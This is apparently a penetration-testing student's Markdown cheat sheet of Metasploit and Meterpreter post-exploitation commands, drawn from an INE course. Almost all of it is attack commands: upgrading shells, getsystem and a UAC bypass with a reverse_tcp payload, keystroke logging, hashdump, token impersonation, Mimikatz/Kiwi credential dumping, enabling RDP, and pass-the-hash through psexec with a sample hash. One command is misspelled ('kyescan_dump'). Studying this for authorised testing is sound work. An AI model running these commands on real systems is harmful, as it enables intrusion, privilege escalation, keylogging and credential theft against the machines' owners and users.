# Post Exploitation.md

* [Meterpreter Fundamentals](#meterpreter-fundamentals)
* [Upgrading Command Shells To Meterpreter Shells](#upgrading-command-shells-to-meterpreter-shells)
* [Windows Post Exploitation](#windows-post-exploitation)

***********************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
***********************************************************************

## Meterpreter Fundamentals

```
sysinfo
```
```
getuid
```
```
help
```
```
background
```
```
sessions
```
```
sessions -h
```
```
exit
```
```
search
```
```
show options
```
```
loot
```

***********************************************************************

## Upgrading Command Shells To Meterpreter Shells

### Auto method
```
sessions -u [SESSION-ID]
```
Use session:
```
sessions [SESSION-ID]
```

### More manual method
```
search shell_to_meterpreter
```
```
post/multi/manage/shell_to_meterpreter
```
```
set session [SESSION-ID]
```
```
set LHOST [ATTACK-IP or INTERFACE]
```
```
run
```
```
sessions
```
Use session:
```
sessions [SESSION-ID]
```

***********************************************************************

## Windows Post Exploitation

There are windows specific meterpreter commands, use 'help' to list commands.  
Attempt to elevate privileges:
```
getsystem
```
```
hashdump
```
```
enumdesktops
```
```
keyscan_start
```
```
keyscan_stop
```
```
kyescan_dump
```
```
screenshot
```
```
show_mount
```
```
ps
```
```
migrate [PID]
```

### Modules

```
use post/windows/manage/migrate
```
```
use post/windows/gather/win_privs
```
```
use post/windows/manage/migrate
```
```
use post/windows/gather/enum_logged_on_users
```
```
use post/windows/gather/checkvm
```
```
use post/windows/gather/enum_applications
```
```
use post/windows/gather/enum_av_excluded
```
```
use post/windows/gather/enum_computers
```
```
use post/windows/gather/enum_patches
```
```
use post/windows/gather/enum_shares
```
```
use post/windows/manage/enable_rdp
```

### Bypassing UAC

```
search bypassuac
```
```
use exploit/windows/local/bypassuac_injection
```
```
set payload windows/x64/meterpreter/reverse_tcp
```
```
set SESSION [SESSION-ID]
```
```
set LPORT [PORT]
```
```
set TARGET Windows\ x64
```
```
run
```
```
getsystem
```

### Token Impersonation with Incognito

Once initial meterpreter session is obtained, list user privileges:
```
getprivs
```
If SeImpersonatePrivilege is set:

```
load incognito
```
```
list_tokens -u
```
Copy name of Delegation Token then run:
```
impersonate_token "[TOKEN]"
```
Example:
```
impersonate_token "ATTACKDEFENSE\Administrator"
```
Confirm privileges:
```
getuid
```
Migrate to x64 process:
```
pgrep explorer
```
```
migrate [EXPLORER-PID]
```
Check privileges again:
```
getprivs
```
```
getuid
```
List Tokens again to escalate privileges further:
```
list_tokens -u
```
and impersonate the next token:
```
impersonate_token "NT AUTHORITY\SYSTEM"
```

### Kiwi (Mimikatz msfconsole extension)

```
migrate [LSASS-PID]
```
```
load kiwi
```
Help menu:
```
?
```
Retrieve all credentials (parsed):
```
creds_all
```
Dump hashes for all users:
```
lsa_dump_sam
```
Possibly dump clear text creds:
```
lsa_dump_secrets
```

### Pass-The-Hash with PSExec Module

```
use exploit/windows/smb/psexec
```
```
set PAYLOAD [PAYLOAD]
```
```
set SMBUser [USERNAME]
```
```
set SMBPass [LM-HASH:NTLM-HASH]
```
Example:
```
set SMBPass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
```

***********************************************************************

### References
Penetration Tester Student v2 by INE  
https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student-v2